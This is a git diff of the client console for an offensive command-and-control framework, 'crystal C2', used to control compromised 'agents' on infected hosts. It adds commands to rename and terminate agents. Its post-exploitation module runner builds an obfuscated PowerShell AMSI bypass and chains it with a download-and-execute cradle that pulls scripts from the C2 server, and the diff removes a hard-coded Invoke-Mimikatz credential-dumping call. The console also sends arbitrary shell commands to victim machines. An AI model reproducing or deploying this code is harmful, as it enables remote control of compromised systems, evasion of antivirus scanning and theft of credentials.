@@ -9,7 +9,7 @@ from lib.helpers.obfuscation_engine import obfuscate_powershell
 from server.models import ListenerModel
 from typing import List
 from server.server import AgentModule, CrystalServer, ScriptModule
-from lib.helpers.output import Color, failure, get_random_string, printinfo, success
+from lib.helpers.output import Color, failure, get_random_string, printinfo, success, printlog
 import os, sys
 import random, requests
 from cmd import Cmd
@@ -27,7 +27,7 @@ _/ ___\_  __ <   |  |/  ___/\   __\__  \ |  |
 """
     ]
 
-    subline = "\ncrystal C2 v0.0.1\n"
+    subline = "\n    crystal C2 v0.0.1\n"
     return f"{random.choice(banners)}{Color.B}{subline}{Color.NC}"
 
 API_BASE = "http://127.0.0.1:9292" # default overwritten by config
@@ -99,6 +99,29 @@ class Api:
                 }
         )
 
+    @staticmethod
+    def rename_agent(old_name, new_name):
+        """
+        Rename the agent
+        """
+        requests.post(
+            f'{API_BASE}/api/tasks/{old_name}',
+            data={
+                "task": f"rename {new_name}"
+            }
+        )
+
+    @staticmethod
+    def remove_agent(agent_name):
+        """
+        Terminate an agent
+        """
+        requests.post(
+            f'{API_BASE}/api/agents/{agent_name}',
+            data={
+                "task": "terminate"
+            }
+        )
 
 
 class BaseConsole(Cmd):
@@ -135,7 +158,7 @@ class BaseConsole(Cmd):
     def do_interact(self, agent_name):
         'Interact with an active agent'
         for a in Api.get_active_agents():
-            if a["name"] == agent_name: 
+            if a["name"] == agent_name:
                 InteractAgentConsole(a, self).cmdloop()
                 return
         
@@ -172,32 +195,58 @@ class InteractAgentConsole(BaseConsole):
     """
     Console to interact with an agent
     """
+    def __generate_prompt(self, selected_agent):
+        return f"\n({Color.B}crystal{Color.NC}) agent {Color.R}{selected_agent['name']}{Color.NC} -> {selected_agent['username']}@{selected_agent['ip_address']} > "
+
     def __init__(self, selected_agent, encapsulating_console: Cmd):
         super().__init__(encapsulating_console)
         self.selected_agent = selected_agent
-        self.prompt = f"\n({Color.B}crystal{Color.NC}) agent {Color.R}{selected_agent['name']}{Color.NC} -> {selected_agent['username']}@{selected_agent['ip_address']} > "
+        self.prompt = self.__generate_prompt(self.selected_agent)
 
     def default(self, command):
         'Default action: Send a shell command to run to the agents queue'
+
         Api.add_agent_task(self.selected_agent['name'], f"shell {command}")
+
         success(f"Queued command: {command} to agent {self.selected_agent['name']}")
+
         time.sleep(4) # TODO either wait for a signal or make a global variable indicating whether result returned
 
+    def do_rename(self, new_name):
+        'Rename the current agent. Usage: rename <NAME>'
+
+        # todo what if duplicate + what if not reachable
+        Api.rename_agent(self.selected_agent['name'], new_name)
+
+        success(f"Renaming agent {self.selected_agent['name']} to {new_name}")
+        self.selected_agent['name'] = new_name
+
+        # update prompt
+        self.prompt = self.__generate_prompt(self.selected_agent)
+
+        time.sleep(4)  # TODO either wait for a signal or make a global variable indicating whether result returned
+
+    def do_listmodules(self, text):
+        'List all available post-exploitation modules'
+        [print(f"{module['name']}\t\t{module['description']}") for module in Api.get_available_post_modules()]
+
     def do_module(self, args):
-        'Run a Post-Exploitation module on the infected host'
+        'Run a post-exploitation module on the infected host'
         # prepare download cradle with amsi bypass for script
         # id is the index of the available post modules array
 
         # get id of module
         module_id = 0
-        for module in Api.get_available_post_modules(): # todo only load available modules on startup
+        for module in Api.get_available_post_modules():
             if module['name'] == args:
-                amsi_bypass = "[Ref].Assembly.GetType('System.Mana'+'gement.Automa'+'tion.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVA'+'HQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4A'+'aQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,St'+'atic').SetValue($null,$true)"
-                # TODO amsi_bypass = obfuscate_powershell(amsi_bypass)
+                amsi_bypass = "[ReF].AsSeMbly.GeTType('System.Mana'+'gement.Automa'+'tion.'+$([Text.Encoding]::Unicode.GetStriNg([ConveRt]::fromBasE64String('QQBtAHMAaQBVA'+'HQAaQBsAHMA')))).GetField($([Text.Encoding]::UniCode.GEtString([Convert]::FromBase64String('YQBtAHMAaQBJAG4A'+'aQB0AEYAYQBpA'+'GwAZQBkAA=='))),'NoNPublIc,St'+'atic').setvALuE($null,$true)"
+                # TODO obfuscate amsi bypass
+                # amsi_bypass = obfuscate_powershell(amsi_bypass)
                 script = f"{amsi_bypass}; IEX(New-Object Net.WebClient).DownloadString('{API_BASE}/api/dl/{module_id}')"
-                script += "; Invoke-Mimikatz" # TODO: get from modules.yaml or py script
+                script += f"; {module['command']}"
 
                 Api.add_agent_task(self.selected_agent['name'], f"shell {script}")
+
                 success(f"Queued module execution: {args} to agent {self.selected_agent['name']}")
                 time.sleep(4)  # TODO either wait for a signal or make a global variable indicating whether result returned
                 return
@@ -211,11 +260,18 @@ class InteractAgentConsole(BaseConsole):
         raise NotImplementedError
 
     def do_persist(self, args):
-        'Add the agent to autostart on the infected host'
+        'Add the current agent to autostart on the infected host'
+        raise NotImplementedError
 
     def do_terminate(self, args):
-        'Terminate the agent'
-        raise NotImplementedError
+        'Terminate the current agent'
+        Api.remove_agent(self.selected_agent['name'])
+
+        success(f"Terminating agent {self.selected_agent['name']}")
+        time.sleep(4)  # TODO either wait for a signal or make a global variable indicating whether result returned
+
+        # leave agent console
+        self.do_back(None)
 
 class CreateAgentConsole(BaseConsole):
     """
@@ -239,10 +295,11 @@ class CreateAgentConsole(BaseConsole):
 
     def do_options(self, args):
         'Show available options'
+        print("Option\t\tCurrent value\t\tRequired\tDescription")
+        print("-------------------------------------------------------------------------------------")
         for _, o in self.options.items():
-            print("Option\t\tCurrent value\t\tRequired\tDescription")
-            print("-------------------------------------------------------------------------------------")
-            print(f'{o["name"]}\t{o["value"]}\t\t{o["required"]}\t\t{o["description"]}')
+            val = o["value"] if o["value"] else "! NOT SET"
+            print(f'{o["name"]}\t{val}\t\t{o["required"]}\t\t{o["description"]}')
     
     def do_set(self, option):
         'Set an option'
@@ -258,12 +315,12 @@ class CreateAgentConsole(BaseConsole):
             print("Usage: set OPTION VALUE")
 
     def complete_set(self, text, line, begidx, endidx):
-        try:
-            option, value = text.split()
-            if option in self.options.keys():
-                return self.options[option]["completion"](value)
-        except:
-            return [option for option in self.options if option.startswith(text)]
+        if text == "set ":
+            return [option for option in self.options.keys()]
+        _, option = line.split()
+        if option in self.options.keys():
+            return self.options[option]["completion"](text)
+        return [option for option in self.options.keys() if option.startswith(text)]
 
     def do_generate(self, args):
         'Generate a payload for the current module'
@@ -329,7 +386,7 @@ if __name__ == '__main__':
         print("Usage: crystalc2 [server | client]")
         sys.exit(1)
 
-    success("Reading config from config.yaml")
+    printlog("Reading config from config.yaml")
     with open("config.yaml") as f: 
         data = yaml.load(f, Loader=SafeLoader)
         SERVER_PORT = data['listen_port']
